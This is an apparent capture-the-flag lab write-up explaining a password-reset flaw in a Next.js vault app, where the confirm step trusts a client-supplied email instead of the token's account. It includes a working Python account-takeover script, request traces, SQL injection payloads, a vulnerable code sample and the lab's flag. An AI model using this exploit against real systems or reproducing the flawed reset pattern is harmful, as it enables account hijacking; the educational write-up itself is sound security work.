# vaultly-002 - BugForge Lab Walkthrough

**URL:** https://lab-1785927603137-4idzak.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Authentication - password reset endpoint trusts a client-supplied email instead of the token's bound account
**Flag:** `bug{JORnMPv7thIWhdlMV0SuPv32UQofzJfC}`

---

## Summary

Vaultly is a Next.js document-vault SaaS with a multi-tenant org model (owner/admin/editor/viewer roles). The self-service password reset flow lets any authenticated user, including the lowest-privileged `viewer` role, generate a one-time reset token for their own account, then swap the `email` field on the confirm step to a victim's address while reusing that same token. The server never verifies the token is actually bound to the submitted email, so it happily updates whatever account matches the email in the request body. This gives full password takeover of any other account, including the org owner, with zero knowledge of their real password.

---

## Tech Stack

- Next.js (App Router, server-rendered forms posting directly to Route Handlers)
- Cookie session (`vaultly_session`, HttpOnly, Secure, SameSite=Lax)
- Seeded demo accounts (`owner@acme.test`, `admin@acme.test`, `editor@acme.test`, `viewer@acme.test`, all password `vaultly`) shown directly on the login page, alongside additional org members with unrelated unknown passwords

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/auth/login` | POST | No | form-encoded `email`/`password`/`next` |
| `/api/auth/register` | POST | No | creates a new org + owner account; blocks duplicate emails correctly |
| `/api/auth/reset/request` | POST | Session | generates a token for the caller's own account; token returned directly via a redirect `Location` header instead of being emailed |
| `/api/auth/reset/confirm` | POST | No | `token`, `email`, `password` - **does not check the token is bound to that email** |
| `/api/sso` | POST | Session | accepts a domain claim with no ownership verification |
| `/api/members` | POST | Session | role/remove actions on org members |

---

## Discovery

### Step 1 - Map the write surface for missing ownership checks

Standard IDOR/broken-access-control methodology on this app family is to walk every endpoint that mutates state and check whether it enforces that the acting session actually owns the target resource. Vaultly exposes a fairly small settings surface: members, SSO, connected apps, API tokens, security (password reset), and an audit log. Each of these accepts a POST from any authenticated role, so each was tested individually.

### Step 2 - Rule out the obvious candidates

- Re-registering with an existing user's email (`owner@acme.test`) to hijack the account outright was cleanly blocked with `"An account with that email already exists."`
- SQL injection payloads against the login form returned nothing useful; the route is strictly form-encoded and validates input cleanly.
- The `/api/sso` domain-claim endpoint accepted a domain (`acme.test`) it did not own from an unrelated attacker-controlled org, with zero ownership verification - a real secondary issue, but it has no discoverable login-flow trigger in this build (setting SSO enabled for a claimed domain does not change how normal password logins for that domain behave), so it's a dead end on its own.

### Step 3 - The password reset flow

The `/settings/security` page exposes one action: "Email me a reset link". Since the sandbox has no real mail server, the reset endpoint returns the link directly:

```
POST /api/auth/reset/request  (authenticated as viewer@acme.test)
-> 303 Location: /settings/security?link=%2Freset%3Ftoken%3D<TOKEN>
```

Fetching `/reset?token=<TOKEN>` renders the confirm form, and its HTML is the tell:

```html
<form action="/api/auth/reset/confirm" method="post">
  <input type="hidden" name="token" value="<TOKEN>"/>
  <input type="hidden" name="email" value="viewer@acme.test"/>
  <input id="password" type="password" name="password"/>
</form>
```

A hidden `email` field that duplicates information the token should already encode is a strong signal the server might be reading that field back on submit instead of re-deriving the account from the token itself. Testing it directly confirmed it in one request: swap the `email` value to a different account and submit.

```
POST /api/auth/reset/confirm
token=<TOKEN>&email=owner@acme.test&password=Hacked1234!

-> 303 Location: /login?msg=Password%20updated.%20Please%20sign%20in.
```

Logging in as `owner@acme.test` with the new password succeeds immediately - full account takeover using only a token minted for a completely unrelated, lower-privileged account.

```
POST /api/auth/login
email=owner@acme.test&password=Hacked1234!&next=/dashboard

-> 303, sets vaultly_session for the owner account
```

The flag is embedded directly in the server-rendered `/dashboard` and `/settings/security` pages once authenticated as the owner.

---

## Proof of Concept

```python
import urllib.request, urllib.parse

BASE = "https://lab-1785927603137-4idzak.labs-app.bugforge.io"

class NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response
    https_response = http_response

opener = urllib.request.build_opener(NoRedirect)

def post_form(path, fields, cookie=None):
    data = urllib.parse.urlencode(fields).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method="POST")
    with opener.open(req, timeout=10) as resp:
        return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)

# 1. Log in as the lowest privileged seeded demo account
status, _, headers = post_form("/api/auth/login", {
    "email": "viewer@acme.test", "password": "vaultly", "next": "/dashboard"
})
cookie = headers["Set-Cookie"].split(";")[0]

# 2. Request a reset token scoped to our own (viewer) account
status, _, headers = post_form("/api/auth/reset/request", {}, cookie=cookie)
token = headers["Location"].split("token%3D")[1]

# 3. Replay confirm, unauthenticated, swapping the email to the victim
post_form("/api/auth/reset/confirm", {
    "token": token, "email": "owner@acme.test", "password": "Hacked1234!"
})

# 4. Log in as the victim with the new password
status, _, headers = post_form("/api/auth/login", {
    "email": "owner@acme.test", "password": "Hacked1234!", "next": "/dashboard"
})
print("Takeover succeeded:", status in (302, 303))
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| SQLi payloads on login (`' OR 1=1--`, etc.) | No effect, form-encoded route validates cleanly | Not injectable |
| Default admin credentials guess | Not applicable / no shortcut | This app uses cookie sessions, no bypass found there |
| Passing `email` on `/api/auth/reset/request` to target another user directly | Ignored - the request step always scopes the token to the caller's own session | The trust boundary is broken on **confirm**, not **request** |
| Re-registering with an existing user's email to hijack the account | Correctly blocked with a clear duplicate-email error | Registration path is solid |
| SSO domain-claim (`POST /api/sso` with an unowned domain) | Accepted with no ownership check, but no reachable login-flow trigger | Real secondary finding, not exploitable on its own in this build |

---

## Root Cause

`/api/auth/reset/confirm` looks up the account to mutate using the client-supplied `email` field instead of resolving it from the `token` record server-side:

```javascript
// Vulnerable pattern (approximate)
app.post("/api/auth/reset/confirm", async (req, res) => {
  const { token, email, password } = req.body;
  const resetRecord = await db.get("SELECT * FROM reset_tokens WHERE token = ? AND expires_at > ?", [token, Date.now()]);
  if (!resetRecord) return res.redirect("/login?error=invalid");

  // BUG: trusts req.body.email instead of resetRecord.user_id / resetRecord.email
  await db.run("UPDATE users SET password_hash = ? WHERE email = ?", [hash(password), email]);
  res.redirect("/login?msg=Password updated. Please sign in.");
});
```

The query should filter by the user id or email already stored on the token record, not by a value taken straight from the request body. Contributing factor: the confirm page pre-fills `email` as a plain, unsigned hidden form field, which invites exactly this kind of tampering.

---

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **CWE-640**: Weak Password Recovery Mechanism
- **OWASP A01:2021** - Broken Access Control
- **OWASP A07:2021** - Identification and Authentication Failures
